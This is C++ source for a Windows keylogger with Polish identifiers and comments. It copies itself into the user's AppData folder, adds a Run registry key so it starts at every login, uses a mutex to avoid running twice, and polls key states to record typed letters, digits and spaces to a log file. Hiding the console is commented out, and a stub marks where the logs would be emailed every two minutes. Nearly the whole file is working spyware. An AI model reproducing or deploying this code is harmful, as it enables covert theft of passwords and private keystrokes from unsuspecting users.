#include <iostream>
#include <windows.h>
#include <stdio.h>
#include <cstring>

using namespace std;

const string SCIEZKA_W_SYSTEMIE = getenv("APPDATA")+string("\\KeyloggerLive.exe");
const string SCIEZKA_LOGOW = getenv("APPDATA")+string("\\logi.txt");

bool antyDuplikacja()
{
    CreateMutex(NULL, TRUE, "5da64e2b2ed82f3ac144d1a87f78b16ahakeredupl");
    if (GetLastError() == ERROR_ALREADY_EXISTS)
    {
        return true;
    }
    else
    {
        return false;
    }
}

void ukryjKonsole()
{
    //FreeConsole();
}

void kopiujDoSystemu(string sciezka)
{
    string komenda = "copy "+sciezka+" "+SCIEZKA_W_SYSTEMIE;
    system(komenda.c_str());
}

void dodajDoAutostartu(string sciezka)
{
    string komenda = "reg ADD HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v KeyloggerTEST /f /t REG_SZ /d ";
    komenda.append(SCIEZKA_W_SYSTEMIE);
    cout << komenda << endl;
    system(komenda.c_str());

    kopiujDoSystemu(sciezka);

    if (sciezka!=SCIEZKA_W_SYSTEMIE)
    {
        string komenda = "start ";
        komenda.append(SCIEZKA_W_SYSTEMIE);
        system(komenda.c_str());
        exit(EXIT_SUCCESS);
    }

}


void wyslijMaila()
{
    //Zaimplementuj wyslij logi co 2 minuty
}

void zapiszLogi(int liczba)
{
    FILE * plik;
    plik = fopen(SCIEZKA_LOGOW.c_str(), "a");
    if (plik!=NULL)
    {
        fputc((char)liczba, plik);
        fclose(plik);
    }
}

void wlaczKeyloggera()
{
    int liczba;
    int tymczasowa;

    while(true)
    {
        //ZCZYTUJE A-Z
        for(liczba=65; liczba<91; liczba++)
        {
            tymczasowa = GetAsyncKeyState(liczba);

            if (tymczasowa==-32767 && !GetAsyncKeyState(VK_SHIFT))
            {
                cout << (char)(liczba+32);
                zapiszLogi((liczba+32));
            }
            else if (tymczasowa==-32767 && GetAsyncKeyState(VK_SHIFT))
            {
                cout << (char)liczba;
                zapiszLogi(liczba);
            }

        }

        //ZCZYTUJE LICZBY
        for(liczba=48; liczba<58; liczba++)
        {
            if (GetAsyncKeyState(liczba)==-32767)
            {
                cout << (char)liczba;
                zapiszLogi(liczba);
            }
        }

        /*
                ZNAKI SPECJALNE
        */

        if (GetAsyncKeyState(VK_SPACE)==-32767)
        {
            cout << " ";
            zapiszLogi(32);
        }

        if (GetAsyncKeyState(VK_RETURN)==-32767)
        {
            cout << "[ENTER]";
        }
        if (GetAsyncKeyState(VK_BACK)==-32767)
        {
            cout << "[BS]";
        }
        if (GetAsyncKeyState(VK_CAPITAL)==-32767)
        {
            cout << "[CS]";
        }
        if (GetAsyncKeyState(VK_DELETE)==-32767)
        {
            cout << "[DEL]";
        }
        if (GetAsyncKeyState(VK_TAB)==-32767)
        {
            cout << "[TAB]";
        }
        if (GetAsyncKeyState(VK_ESCAPE)==-32767)
        {
            cout << "[ESC]";
        }
        if (GetAsyncKeyState(VK_MENU)==-32767)
        {
            cout << "[ALT]";
        }
        if (GetAsyncKeyState(VK_SNAPSHOT)==-32767)
        {
            cout << "[PRTSC]";
        }
        if (GetAsyncKeyState(VK_TAB)==-32767)
        {
            cout << "[TAB]";
        }
    }
}

int main(int argc, char * argv[])
{
    if (!antyDuplikacja())
    {
        ukryjKonsole();
        Sleep(3000);
        dodajDoAutostartu(argv[0]);
        wlaczKeyloggera();
    }

    return 0;
}
